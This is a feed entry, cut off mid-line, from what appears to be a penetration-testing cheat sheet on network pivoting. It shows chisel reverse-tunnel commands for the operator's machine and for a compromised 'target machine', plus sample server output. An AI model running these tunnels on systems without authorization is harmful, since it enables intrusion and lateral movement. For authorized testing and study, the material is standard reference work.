channel.title: Port Forwarding on TLDRBins
channel.description: Recent content in Port Forwarding on TLDRBins

item.title: Network Traffic Pivoting
item.description: Tunneling Chisel ssh socat metasploit sliver Start a local chisel Server # In our local Linux machine ./chisel server --reverse --port <LOCAL_PORT> $ ./chisel server --reverse --port 8000 2024/09/23 12:27:03 server: Reverse tunnelling enabled 2024/09/23 12:27:03 server: Fingerprint ikFn6iQOOodxIlcDQI4dvFu1pdHgV5UnHRenxUg0eho= 2024/09/23 12:27:03 server: Listening on http://0.0.0.0:8000 Ports forwarding # In target machine ./chisel client <LOCAL_IP>:<LOCAL_PORT> R:<TARGET_PORT>:127.0.0.1:<TARGET_PORT> # Mutiple ports fowarding, can be different targets in the same subnet ./chisel client <LOCAL_IP>:<LOCAL_PORT> R:8080:172.
